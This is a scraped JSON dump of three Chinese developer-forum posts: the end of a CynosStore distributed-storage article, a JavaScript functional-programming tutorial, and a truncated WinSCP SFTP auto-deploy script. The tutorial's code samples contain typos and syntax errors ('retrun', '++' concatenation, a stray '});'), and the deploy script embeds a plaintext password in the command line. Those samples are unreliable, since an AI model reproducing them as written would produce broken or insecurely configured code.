CynosStore日志路由和乱序ACK</p>\n<p>只要是连续日志根据数据分片路由，就会有日志乱序ack的问题，从而必须对日志ack进行归并。Aurora有这个机制，CynosDB同样有。为了便于理解，我们对Journal中的各个关键点的命名采用跟Aurora同样的方式。</p>\n<p>这里需要重点描述的是MTR，MTR是CynosStore提供的原子写单位，CSJ就是由一个MTR紧挨着一个MTR组成的，任意一个日志必须属于一个MTR，一个MTR中的多条日志很有可能属于不同的SG。针对PostgreSQL引擎，可以近似理解为：一个XLogRecord对应一个MTR，一个数据库事务的日志由一个或者多个MTR组成，多个数据库并发事务的MTR可以相互穿插。但是CynosStore并不理解和感知数据库引擎的事务逻辑，而只理解MTR。发送给CynosStore的读请求所提供的读点必须不能在一个MTR的内部某个日志点。简而言之，MTR就是CynosStore的事务。</p>\n<h1><strong>四、故障恢复</strong></h1>\n<p>当主实例发生故障后，有可能这个主实例上Pool中各个SG持久化的日志点在全局范围内并不连续，或者说有空洞。而这些空洞所对应的日志内容已经无从得知。比如有3条连续的日志j1, j2, j3分别路由到三个SG上，分别为sg1, sg2, sg3。在发生故障的那一刻，j1和j3已经成功发送到sg1和sg3。但是j2还在CynosStore Client所在机器的网络缓冲区中，并且随着主实例故障而丢失。那么当新的主实例启动后，这个Pool上就会有不连续的日志j1, j3，而j2已经丢失。</p>\n<p>当这种故障场景发生后，新启动的主实例将会根据上次持久化的连续日志VDL，在每个SG上查询自从这个VDL之后的所有日志，并将这些日志进行归并，计算出新的连续持久化的日志号VDL。这就是新的一致性点。新实例通过CynosStore提供的Truncate接口将每个SG上大于VDL的日志truncate掉，那么新实例产生的第一条journal将从这个新的VDL的下一条开始。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1002332/pv16ouuu8s.png?imageView2/2/w/1620\" alt=\"img\">故障恢复时日志恢复过程</p>\n<p>图六：故障恢复时日志恢复过程</p>\n<p>如果图五刚好是某个数据库实例故障发生的时间点，当重新启动一个数据库读写实例之后，图六就是计算新的一致性点的过程。CynosStore Client会计算得出新的一致性点就是8，并且把大于8的日志都Truncate掉。也就是把SG2上的9和10truncate掉。下一个产生的日志将会从9开始。</p>\n<h1><strong>五、多副本一致性</strong></h1>\n<p>CynosStore采用Multi-RAFT来实现SG的多副本一致性， CynosStore采用批量和异步流水线的方式来提升RAFT的吞吐量。我们采用CynosStore自定义的benchmark测得单个SG上日志持久化的吞吐量为375万条/每秒。CynosStore benchmark采用异步写入日志的方式测试CynosStore的吞吐量，日志类型包含SetByte和SetBit两种，写日志线程持续不断地写入日志，监听线程负责处理ack回包并推进VDL，然后benchmark测量单位时间内VDL的推进速度。375万条/秒意味着每秒钟一个SG持久化375万条SetByte和SetBit日志。在一个SG的场景下，CynosStore Client到Store Node的平均网络流量171MB/每秒，这也是一个Leader到一个Follower的网络流量。</p>\n<h1><strong>六、一写多读</strong></h1>\n<p>CynosDB基于共享存储CynosStore，提供对同一个Pool上的一写多读数据库实例的支持，以提升数据库的吞吐量。基于共享存储的一写多读需要解决两个问题：</p>\n<p>\\1. 主节点（读写节点）如何将对页的修改通知给从节点（只读节点）。因为从节点也是有Buffer的，当从节点缓存的页面在主节点中被修改时，从节点需要一种机制来得知这个被修改的消息，从而在从节点Buffer中更新这个修改或者从CynosStore中重读这个页的新版本。</p>\n<p>\\2. 从节点上的读请求如何读到数据库的一致性的快照。开源PostgreSQL的主备模式中，备机通过利用主机同步过来的快照信息和事务信息构造一个快照（活动事务列表）。CynosDB的从节点除了需要数据库快照（活动事务列表）以外，还需要一个CynosStore的快照（一致性读点）。因为分片的日志时并行apply的。</p>\n<p>如果一个一写多读的共享存储数据库集群的存储本身不具备日志重做的能力，主从内存页的同步有两种备选方案：</p>\n<p>第一种备选方案，主从之间只同步日志。从实例将至少需要保留主实例自从上次checkpoint以来所有产生的日志，一旦从实例产生cache miss，只能从存储上读取上次checkpoint的base页，并在此基础上重放日志缓存中自上次checkpoint以来的所有关于这个页的修改。这种方法的关键问题在于如果主实例checkpoint之间的时间间隔太长，或者日志量太大，会导致从实例在命中率不高的情况下在apply日志上耗费非常多的时间。甚至，极端场景下，导致从实例对同一个页会反复多次apply同一段日志，除了大幅增大查询时延，还产生了很多没必要的CPU开销，同时也会导致主从之间的延时有可能大幅增加。</p>\n<p>第二种备选方案，主实例向从实例提供读取内存缓冲区数据页的服务，主实例定期将被修改的页号和日志同步给从实例。当读页时，从实例首先根据主实例同步的被修改的页号信息来判断是1）直接使用从实例自己的内存页，还是2）根据内存页和日志重放新的内存页，还是3）从主实例拉取最新的内存页，还是4）从存储读取页。这种方法有点类似Oracle RAC的简化版。这种方案要解决两个关键问题：1）不同的从实例从主实例获取的页可能是不同版本，主实例内存页服务有可能需要提供多版本的能力。2）读内存页服务可能对主实例产生较大负担，因为除了多个从实例的影响以外，还有一点就是每次主实例中的某个页哪怕修改很小的一部分内容，从实例如果读到此页则必须拉取整页内容。大致来说，主实例修改越频繁，从实例拉取也会更频繁。</p>\n<p>相比较来说，CynosStore也需要同步脏页，但是CynosStore的从实例获取新页的方式要灵活的多有两种选择1）从日志重放内存页；2）从StoreNode读取。从实例对同步脏页需要的最小信息仅仅是到底哪些页被主实例给修改过，主从同步日志内容是为了让从实例加速，以及降低Store Node的负担。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1002332/s6znjh9dji.png?imageView2/2/w/1620\" alt=\"img\">CynosDB一写多读</p>\n<p>图七 CynosDB一写多读</p>\n<p>图七描述了一写一读（一主一从）的基本框架，一写多读（一主多从）就是一写一读的叠加。CynosStore Client（CSClient）运行态区分主从，主CSClient源源不断地将CynosStore Journal（CSJ）从主实例发送到从实例，与开源PostgreSQL主备模式不同的是，只要这些连续的日志到达从实例，不用等到这些日志全部apply，DB engine就可以读到这些日志所修改的最新版本。从而降低主从之间的时延。这里体现“基于日志的存储”的优势：只要主实例将日志持久化到Store Node，从实例即可读到这些日志所修改的最新版本数据页。</p>\n<h1><strong>七、结语</strong></h1>\n<p>CynosStore是一个完全从零打造、适应云数据库的分布式存储。CynosStore在架构上具备一些天然优势：1）存储计算分离，并且把存储计算的网络流量降到最低； 2）提升资源利用率，降低云成本，3）更加有利于数据库实例实现一写多读，4）相比一主两从的传统RDS集群具备更高的性能。除此之外，后续我们会在性能、高可用、资源隔离等方面对CynosStore进行进一步的增强。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"一个数据库存储架构的独白","last_reply_at":"2018-12-28T03:13:39.557Z","good":false,"top":false,"reply_count":1,"visit_count":632,"create_at":"2018-12-28T03:06:31.822Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c2582ea3898674067a791fc","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> JS函数式编程入门。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017526981\">学会使用函数式编程的程序员(第2部分)</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/minnanitkong\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-28-01.png\" alt></p>\n<p>本系列的其他文章:</p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000017511211\">学会使用函数式编程的程序员(第1部分)</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017545008\">学会使用函数式编程的程序员(第3部分)</a></li>\n</ul>\n<h3>组合函数 (Function Composition)</h3>\n<p>作为程序员，我们是懒惰的。我们不想构建、测试和部署我们编写的一遍又一遍的代码。我们总是试图找出一次性完成工作的方法，以及如何重用它来做其他事情。</p>\n<p>代码重用听起来很棒，但是实现起来很难。如果代码业务性过于具体，就很难重用它。如时代码太过通用简单，又很少人使用。所以我们需要平衡两者，一种制作更小的、可重用的部件的方法，我们可以将其作为构建块来构建更复杂的功能。</p>\n<p>在函数式编程中，函数是我们的构建块。每个函数都有各自的功能，然后我们把需要的功能(函数)组合起来完成我们的需求，这种方式有点像乐高的积木，在编程中我们称为 <strong>组合函数</strong>。</p>\n<p>看下以下两个函数：</p>\n<pre class=\"prettyprint language-javascript\"><code>var add10 = function(value) {\n    return value + 10;\n};\nvar mult5 = function(value) {\n    return value * 5;\n};\n</code></pre><p>上面写法有点冗长了，我们用箭头函数改写一下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var add10 = value =&gt; value + 10;\nvar mult5 = value =&gt; value * 5;\n</code></pre><p>现在我们需要有个函数将传入的参数先加上 <strong>10</strong> ，然后在乘以 <strong>5</strong>， 如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var mult5AfterAdd10 = value =&gt; 5 * (value + 10)\n</code></pre><p>尽管这是一个非常简单的例子，但仍然不想从头编写这个函数。首先，这里可能会犯一个错误，比如忘记括号。第二，我们已经有了一个加 10 的函数 <strong>add10</strong> 和一个乘以 5 的函数 <strong>mult5</strong> ，所以这里我们就在写已经重复的代码了。</p>\n<p>使用函数 <strong>add10</strong>，<strong>mult5</strong> 来重构 <strong>mult5AfterAdd10</strong> ：</p>\n<pre class=\"prettyprint language-javascript\"><code>var mult5AfterAdd10 = value =&gt; mult5(add10(value));\n</code></pre><p>我们只是使用现有的函数来创建 <strong>mult5AfterAdd10</strong>，但是还有更好的方法。</p>\n<p>在数学中， <strong>f ∘ g</strong> 是函数组合，叫作“f 由 g 组合”，或者更常见的是 “<strong>f after g</strong>”。 因此 <strong>(f ∘ g)(x)</strong> 等效于f(g(x)) 表示调用 <strong>g</strong> 之后调用 <strong>f</strong>。</p>\n<p>在我们的例子中,我们有 <strong>mult5 ∘ add10</strong> 或 “<strong>add10 after mult5</strong>”,因此我们的函数的名称叫做 <strong>mult5AfterAdd10</strong>。由于Javascript本身不做函数组合，看看 <strong>Elm</strong> 是怎么写的:</p>\n<pre class=\"prettyprint language-javascript\"><code>add10 value =\n    value + 10\nmult5 value =\n    value * 5\nmult5AfterAdd10 value =\n    (mult5 &lt;&lt; add10) value\n</code></pre><p>在 <strong>Elm</strong> 中 &lt;&lt; 表示使用组合函数，在上例中 <strong>value</strong> 传给函数 <strong>add10</strong> 然后将其结果传递给 <strong>mult5</strong>。还可以这样组合任意多个函数:</p>\n<pre class=\"prettyprint language-javascript\"><code>f x =\n   (g &lt;&lt; h &lt;&lt; s &lt;&lt; r &lt;&lt; t) x\n</code></pre><p>这里 <strong>x</strong> 传递给函数 <strong>t</strong>，函数 <strong>t</strong> 的结果传递给 <strong>r</strong>，函数 <strong>t</strong> 的结果传递给 <strong>s</strong>，以此类推。在Javascript中做类似的事情，它看起来会像 <strong>g(h(s(r(t(x)))))</strong>，一个括号噩梦。</p>\n<h3>Point-Free Notation</h3>\n<p><strong>Point-Free Notation</strong>就是在编写函数时不需要指定参数的编程风格。一开始，这风格看起来有点奇怪，但是随着不断深入，你会逐渐喜欢这种简洁的方式。</p>\n<p>在 <strong>multi5AfterAdd10</strong> 中，你会注意到 <strong>value</strong> 被指定了两次。一次在参数列表，另一次是在它被使用时。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 这个函数需要一个参数\n\nmult5AfterAdd10 value =\n    (mult5 &lt;&lt; add10) value \n</code></pre><p>但是这个参数不是必须的，因为该函数组合的最右边一个函数也就是 <strong>add10</strong> 期望相同的参数。下面的 <strong>point-free</strong> 版本是等效的：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 这也是一个需要1个参数的函数\n\nmult5AfterAdd10 =\n    (mult5 &lt;&lt; add10)\n</code></pre><p>使用 point-free 版本有很多好处。</p>\n<ol>\n<li>首先，我们不需要指定冗余的参数。由于不必指定参数，所以也就不必考虑为它们命名。</li>\n<li>由于更简短使得更容易阅读。本例比较简单，想象一下如果一个函数有多个参数的情况。</li>\n</ol>\n<h3>天堂里的烦恼</h3>\n<p>到目前为止，我们已经了解了组合函数如何工作以及如何通过 <strong>point-free</strong> 风格使函数简洁、清晰、灵活。</p>\n<p>现在，我们尝试将这些知识应用到一个稍微不同的场景。想象一下我使用 <strong>add</strong> 来替换 <strong>add10</strong>：</p>\n<pre class=\"prettyprint language-javascript\"><code>add x y =\n    x + y\nmult5 value =\n    value * 5\n</code></pre><p>现在如何使用这两个函数来组合函数 <strong>mult5After10</strong> 呢？</p>\n<p>我们可能会这样写：</p>\n<pre class=\"prettyprint language-javascript\"><code>-- 这是错误的！！！\n\nmult5AfterAdd10 =\n    (mult5 &lt;&lt; add) 10 \n</code></pre><p>但这行不通。为什么? 因为 <strong>add</strong> 需要两个参数。</p>\n<p>这在 <strong>Elm</strong> 中并不明显，请尝试用Javascript编写:</p>\n<pre class=\"prettyprint language-javascript\"><code>var mult5AfterAdd10 = mult5(add(10)); &#x2F;&#x2F; 这个行不通\n</code></pre><p>这段代码是错误的，但是为什么？</p>\n<p>因为这里 <strong>add</strong> 函数只能获取到两个参数（它的函数定义中指定了两个参数）中的一个（实际只传递了一个参数），所以它会将一个错误的结果传递给 <strong>mult5</strong>。这最终会产生一个错误的结果。</p>\n<p>事实上，在 <strong>Elm</strong> 中，编译器甚至不允许你编写这种格式错误的代码(这是 <strong>Elm</strong> 的优点之一)。</p>\n<p>我们再试一次：</p>\n<pre class=\"prettyprint language-javascript\"><code>var mult5AfterAdd10 = y =&gt; mult5(add(10, y)); &#x2F;&#x2F; not point-free\n</code></pre><p>这个不是point-free风格但是我觉得还行。但是现在我不再仅仅组合函数。我在写一个新函数。同样如果这个函数更复杂，例如，我想使用一些其他的东西来组合<strong>mult5AfterAdd10</strong>，我真的会遇到麻烦。</p>\n<p>由于我们不能将这个两个函数对接将会出现函数组合的作用受限。这太糟糕了，因为函数组合是如此强大。</p>\n<p>如果我们能提前给add函数一个参数然后在调用 <strong>mult5AfterAdd10</strong> 时得到第二个参数那就更好了。这种转化我们叫做 <strong>柯里化</strong>。</p>\n<h3>柯里化 (Currying)</h3>\n<p><strong>Currying</strong> 又称部分求值。一个 Currying 的函数首先会接受一些参数，接受了这些参数之后，该函数并不会立即求值，而是继续返回另外一个函数，刚才传入的参数在函数形成的闭包中被保存起来。待到函数被真正需要求值的时候，之前传入的所有参数都会被一次性用于求值</p>\n<p>上例我们在组合函数 <strong>mult5</strong>和 <strong>add(in)</strong> 时遇到问题的是，<strong>mult5</strong> 使用一个参数，<strong>add</strong> 使用两个参数。我们可以通过限制所有函数只取一个参数来轻松地解决这个问题。我只需编写一个使用两个参数但每次只接受一个参数的add函数，函数柯里化就是帮我们这种工作的。</p>\n<blockquote>\n<p>柯里化函数一次只接受一个参数。</p>\n</blockquote>\n<p>我们先赋值 <strong>add</strong> 的第1个参数，然后再组合上 <strong>mult5</strong>，得到 <strong>mult5AfterAdd10</strong> 函数。当 <strong>mult5AfterAdd10</strong> 函数被调用的时候，<strong>add</strong> 得到了它的第 2 个参数。</p>\n<p>JavaScript 实现方式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var add = x =&gt; y =&gt; x + y\n</code></pre><p>此时的 <strong>add</strong> 函数先后分两次得到第 <strong>1</strong> 个和第 <strong>2</strong> 个参数。具体地说，<strong>add</strong>函数接受单参<strong>x</strong>，返回一个也接受单参 <strong>y</strong>的函数，这个函数最终返回 <strong>x+y</strong> 的结果。</p>\n<p>现在可以利用这个 <strong>add 函数来实现一个可行的</strong> mult5AfterAdd10* :</p>\n<pre class=\"prettyprint language-javascript\"><code>var compose = (f, g) =&gt; x =&gt; f(g(x));\nvar mult5AfterAdd10 = compose(mult5, add(10));\n</code></pre><p><strong>compose</strong> 有两个参数 <strong>f</strong> 和 <strong>g</strong>，然后返回一个函数，该函数有一个参数 <strong>x</strong>，并传给函数 <strong>f</strong>，当函数被调用时，先调用函数 <strong>g</strong>,返回的结果作为函数 <strong>f</strong>的参数。</p>\n<p>总结一下，我们到底做了什么？我们就是将简单常见的<strong>add</strong>函数转化成了柯里化函数，这样add函数就变得更加自由灵活了。我们先将第1个参数10输入，而当mult5AfterAdd10函数被调用的时候，最后1个参数才有了确定的值。</p>\n<h3>柯里化与重构(Curring and Refactoring)</h3>\n<p>函数柯里化允许和鼓励你分隔复杂功能变成更小更容易分析的部分。这些小的逻辑单元显然是更容易理解和测试的，然后你的应用就会变成干净而整洁的组合，由一些小单元组成的组合。</p>\n<p>例如，我们有以下两个函数，它们分别将输入字符串用单花括号和双花括号包裹起来：</p>\n<pre class=\"prettyprint language-javascript\"><code>bracketed = function (str) {\n  retrun &quot;{&quot; + str + &quot;}&quot;\n}\n    \ndoubleBracketed = function (str) {\n  retrun &quot;{{&quot; + str + &quot;}}&quot;\n} \n</code></pre><p>调用方式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var bracketedJoe =  bracketed(&#x27;小智&#x27;)\n\nvar doubleBracketedJoe =  doubleBracketed(&#x27;小智&#x27;)\n</code></pre><p>可以将 <strong>bracket</strong> 和 <strong>doubleBracket</strong> 转化为更变通的函数：</p>\n<pre class=\"prettyprint language-javascript\"><code>generalBracket = function( prefix , str ,suffix ) {\n  retrun  prefix ++ str ++ suffix\n}\n</code></pre><p>但每次我们调用 <strong>generalBracket</strong> 函数的时候，都得这么传参：</p>\n<pre class=\"prettyprint language-javascript\"><code>var bracketedJoe = generalBracket(&quot;{&quot;, &quot;小智&quot;, &quot;}&quot;)\n\nvar doubleBracketedJoe = generalBracket(&quot;{{&quot;, &quot;小智&quot;, &quot;}}&quot;)\n</code></pre><p>之前参数只需要输入1个，但定义了2个独立的函数；现在函数统一了，每次却需要传入3个参数,这个不是我们想要的，我们真正想要的是两全其美。</p>\n<p>因为生成小括号双括号功能但一，重新调整一下 我们将 generalBracket 三个参数中的 prefix，str 各柯里化成一个函数，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>generalBracket = function( prefix ) {\n  return  function( suffix ){\n      return function(str){\n          return prefix + str + suffix\n      }\n  }\n}\n</code></pre><p>这样，如果我们要打印单括号或者双括号，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 生成单括号\nvar bracketedJoe = generalBracket(&#x27;{&#x27;)(&#x27;}&#x27;)\nbracketedJoe(&#x27;小智&#x27;) &#x2F;&#x2F; {小智}\n\n&#x2F;&#x2F; 生成双括号\nvar bracketedJoe = generalBracket(&#x27;{{&#x27;)(&#x27;}}&#x27;)\nbracketedJoe(&#x27;小智&#x27;) &#x2F;&#x2F; {{小智}}\n \n</code></pre><h3>常见的函数式函数(Functional Function)</h3>\n<p>函数式语言中3个常见的函数：<strong>Map</strong>,<strong>Filter</strong>,<strong>Reduce</strong>。</p>\n<p>如下JavaScript代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; something.length; ++i) {\n      &#x2F;&#x2F; do stuff\n }\n \n</code></pre><p>这段代码存在一个很大的问题，但不是bug。问题在于它有很多重复代码(boilerplate code)。如果你用命令式语言来编程，比如Java，C#，JavaScript，PHP，Python等等，你会发现这样的代码你写地最多。<strong>这就是问题所在</strong>。</p>\n<p>现在让我们一步一步的解决问题，最后封装成一个看不见 <strong>for</strong> 语法函数：</p>\n<p>先用名为 <strong>things</strong> 的数组来修改上述代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>var things = [1, 2, 3, 4];\nfor (var i = 0; i &lt; things.length; ++i) {\n    things[i] = things[i] * 10; &#x2F;&#x2F; 警告：值被改变!\n}\nconsole.log(things); &#x2F;&#x2F; [10, 20, 30, 40]\n</code></pre><p>这样做法很不对，数值被改变了！</p>\n<p>在重新修改一次：</p>\n<pre class=\"prettyprint language-javascript\"><code>var things = [1, 2, 3, 4];\nvar newThings = [];\nfor (var i = 0; i &lt; things.length; ++i) {\n    newThings[i] = things[i] * 10;\n}\nconsole.log(newThings); &#x2F;&#x2F; [10, 20, 30, 40]\n</code></pre><p>这里没有修改<strong>things</strong>数值，但却却修改了<strong>newThings</strong>。暂时先不管这个，毕竟我们现在用的是 JavaScript。一旦使用函数式语言，任何东西都是不可变的。</p>\n<p>现在将代码封装成一个函数，我们将其命名为 <strong>map</strong>，因为这个函数的功能就是将一个数组的每个值映射(map)到新数组的一个新值。</p>\n<pre class=\"prettyprint language-javacript\"><code>var map = (f, array) =&gt; {\n    var newArray = [];\n    for (var i = 0; i &lt; array.length; ++i) {\n        newArray[i] = f(array[i]);\n    }\n    return newArray;\n};\n</code></pre><p>函数 <strong>f</strong> 作为参数传入，那么函数 <strong>map</strong> 可以对 <strong>array</strong> 数组的每项进行任意的操作。</p>\n<p>现在使用 <strong>map</strong> 重写之前的代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>var things = [1, 2, 3, 4];\nvar newThings = map(v =&gt; v * 10, things);\n</code></pre><p>这里没有 <strong>for</strong> 循环！而且代码更具可读性，也更易分析。</p>\n<p>现在让我们写另一个常见的函数来过滤数组中的元素:</p>\n<pre class=\"prettyprint language-javascript\"><code>var filter = (pred, array) =&gt; {\n    var newArray = [];\nfor (var i = 0; i &lt; array.length; ++i) {\n        if (pred(array[i]))\n            newArray[newArray.length] = array[i];\n    }\n    return newArray;\n};\n</code></pre><p>当某些项需要被保留的时候，断言函数 <strong>pred</strong> 返回TRUE，否则返回FALSE。</p>\n<p>使用过滤器过滤奇数:</p>\n<pre class=\"prettyprint language-javascript\"><code>var isOdd = x =&gt; x % 2 !== 0;\nvar numbers = [1, 2, 3, 4, 5];\nvar oddNumbers = filter(isOdd, numbers);\nconsole.log(oddNumbers); &#x2F;&#x2F; [1, 3, 5]\n</code></pre><p>比起用 <strong>for</strong> 循环的手动编程，<strong>filter</strong> 函数简单多了。最后一个常见函数叫reduce。通常这个函数用来将一个数列归约(reduce)成一个数值，但事实上它能做很多事情。</p>\n<p>在函数式语言中，这个函数称为 <strong>fold</strong>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var reduce = (f, start, array) =&gt; {\n    var acc = start;\n    for (var i = 0; i &lt; array.length; ++i)\n        acc = f(array[i], acc); &#x2F;&#x2F; f() 有2个参数\n    return acc;\n});\n</code></pre><p>reduce函数接受一个归约函数 <strong>f</strong>，一个初始值 <strong>start</strong>，以及一个数组 <strong>array</strong>。</p>\n<p>这三个函数，map,filter,reduce能让我们绕过for循环这种重复的方式，对数组做一些常见的操作。但在函数式语言中只有递归没有循环，这三个函数就更有用了。附带提一句，在函数式语言中，递归函数不仅非常有用，还必不可少。</p>\n<p><strong>原文：</strong></p>\n<p><strong><a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>…</strong>\n<strong><a href=\"https://medium.com/\">https://medium.com/</a><a href=\"/user/cscalfani\">@cscalfani</a>…</strong></p>\n<p><strong>编辑中可能存在的bug没法实时知道，事后为了解决这些bug,花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具Fundebug。</strong></p>\n<p><strong>你的点赞是我持续分享好东西的动力，欢迎点赞！</strong></p>\n<p><strong>一个笨笨的码农，我的世界只能终身学习！</strong></p>\n<p><strong>更多内容请关注公众号《大迁世界》！</strong></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家免费试用！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"学会JavaScript函数式编程(第2部分)","last_reply_at":"2018-12-28T01:56:58.488Z","good":false,"top":false,"reply_count":0,"visit_count":673,"create_at":"2018-12-28T01:56:58.488Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c1b35b03898674067a765a7","author_id":"5c0e2cc3f3d48d2397c0fad9","tab":"share","content":"<div class=\"markdown-text\"><h1>前端项目build完之后自动发布到FTP服务器上</h1>\n<p>以vue-cli的项目为例，很多时候我们改一个BUG之后在本地可能没法直接调试，需要发布到服务器上才能测试，那么问题就来，改一次build一次，再打开FTP工具，然后发布。总觉得很麻烦有没有=_=。\n于是乎作为一个会nodejs的前端er来说，懵生了一个想法，我所用的FTP工具（WinSCP）是不是可以一条命令来搞定？答案是可以的！</p>\n<p>搜了一下，WinSCP的命令是这么写的：</p>\n<pre class=\"prettyprint language-bash\"><code># Windows PowerShell\nPS D:\\Softwares\\WinSCP&gt;winscp.exe &#x2F;console &#x2F;command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp:&#x2F;&#x2F;user:pwd[@ip](&#x2F;user&#x2F;ip):port&quot; &quot;option transfer binary&quot; &quot;put D:\\需要上传的文件路径 &#x2F;服务器文件存放目录&#x2F;&quot; &quot;exit&quot; &#x2F;log=log_file.txt\n</code></pre><p>参数说明：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>winscp.exe /console /command</td>\n<td>命令名</td>\n</tr>\n<tr>\n<td>“option batch continue”</td>\n<td>默认批处理</td>\n</tr>\n<tr>\n<td>“option confirm off”</td>\n<td>关闭提示信息</td>\n</tr>\n<tr>\n<td>“open sftp://user:pwd<a href=\"/user/ip\">@ip</a>:port”</td>\n<td>user：访问用户名 ，pwd：用户密码 ，ip：ip地址，port：端口号 默认22， IPv6地址需要用[]框起来</td>\n</tr>\n<tr>\n<td>“option transfer binary”</td>\n<td>使用二进制格式传送</td>\n</tr>\n<tr>\n<td>log=log_file.txt</td>\n<td>日志文件地址</td>\n</tr>\n<tr>\n<td>“exit”</td>\n<td>执行完命令后退出</td>\n</tr>\n</tbody>\n</table>\n<p>那么，我们最终需要实现的目标是这样一条命令自动build跟发布：</p>\n<pre class=\"prettyprint language-bash\"><code># Windows PowerShell\nPS D:\\我的项目&gt;npm run build:ftp\n</code></pre><p>首先，需要准备以下条件：</p>\n<ol>\n<li>windows系统</li>\n<li>WinSCP(ftp传输工具，需自行下载安装)</li>\n<li>nodejs(估计大家都有)</li>\n</ol>\n<p>接下来在项目根目录创建一个名为ftp.js的文件，然后写一些配置变量</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; ftp.js\n\nconst { exec } = require(&#x27;child_process&#x27;) &#x2F;&#x2F; nodejs子进程模块，用于创建一个cmd进程并执行命令行\n\n&#x2F;&#x2F; 普通密码写法\nlet cmd = &#x27;D:\\\\Softwares\\\\WinSCP\\\\winscp.exe &#x2F;console &#x2F;command &quot;option batch continue&quot; &quot;open sftp:&#x2F;&#x2F;用户名:密码@服务器地址&quot; &quot;put D:\\\\Softwares\\\\我的项目\\\\dist\\\\* &#x2F;opt&#x2F;我的项目&#x2F;&quot; exit &#x2F;log=D:\\\\我的项目.log&#x27;\n\n&#x2F;* \n&#x2F;&#x2F; 私钥文件写法\nlet cmd = &#x27;D:\\\\Softwares\\\\WinSCP\\\\winscp.exe &#x2F;console &#x2F;command &quot;option batch continue&quot; &quot;open sftp:&#x2F;&#x2F;用户名@服务器地址 -hostkey=&quot;&quot;ssh-ed25510 256 sHulrcvtHG+wDY3PaeQN8TyI8qwu35VRP4Y2XXsq+m1=&quot;&quot; -privatekey=&quot;&quot;D:\\\\xxx.ppk&quot; &quot;put D:\\\\Softwares\\\\我的项目\\\\dist\\\\* &#x2F;opt&#x2F;我的项目&#x2F;&quot; exit &#x2F;log=D:\\\\我的项目.log&#x27;\n*&#x2F;\n</code></pre><blockquote>\n<p>关于hostkey在哪里获取，可以在WinSCP软件的服务器列表那里，右键服务器 - 生成会话URL/代码 - 脚本 里面找到</p>\n</blockquote>\n<p>接下来是用nodejs执行cmd这条命令</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; ftp.js\nexec(cmd, function (error) {\n  if (error) {\n    console.error(&#x27;error: &#x27; + error)\n    return\n  }\n  console.log(&#x27;FTP发布完成！详情请看日志：&#x27; + &#x27;D:\\\\我的项目.log&#x27;)\n})\n</code></pre><p>然后在根目录下的package.json文件添加一条配置</p>\n<pre class=\"prettyprint language-json\"><code>...\n&quot;scripts&quot;: {\n  &quot;build:ftp&quot;: &quot;你自己项目对应的build命令 &amp;&amp; node ftp.js&quot;\n}\n...\n</code></pre><p>最终ftp.js文件是这样的</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; ftp.js\n\nconst { exec } = require(&#x27;child_process&#x27;) &#x2F;&#x2F; nodejs子进程模块，用于创建一个cmd进程并执行命令行\n\n&#x2F;&#x2F; 普通密码写法\nlet cmd = &#x27;D:\\\\Softwares\\\\WinSCP\\\\winscp.exe &#x2F;console &#x2F;command &quot;option batch continue&quot; &quot;open sftp:&#x2F;&#x2F;用户名:密码@服务器地址&quot; &quot;put D:\\\\Softwares\\\\我的项目\\\\dist\\\\* &#x2F;opt&#x2F;我的项目&#x2F;&quot; exit &#x2F;log=D:\\\\我的项目.log&#x27;\n\n&#x2F;* \n&#x2F;&#x2F; 私钥文件写法\nlet cmd = &#x27;D:\\\\Softwares\\\\WinSCP\\\\winscp.exe &#x2F;console &#x2F;command &quot;option batch continue&quot; &quot;open sftp:&#x2F;&#x2F;用户名@服务器地址 -hostkey=&quot;&quot;ssh-ed25510 256 sHulrcvtHG+wDY3PaeQN8TyI8qwu35VRP4Y2XXsq+m1=&quot;&quot; -privatekey=&quot;&quot;D:\\\\xxx.ppk&quot; &quot;put D:\\\\Softwares\\\\我的项目\\\\dist\\\\* &#x2F;opt&#x2F;我的项目&#x2F;&quot; exit &#x2F;log=D:\\\\我的项目.log&#x27;\n*&#x2F;\n\nexec(cmd, function (error) {\n  if 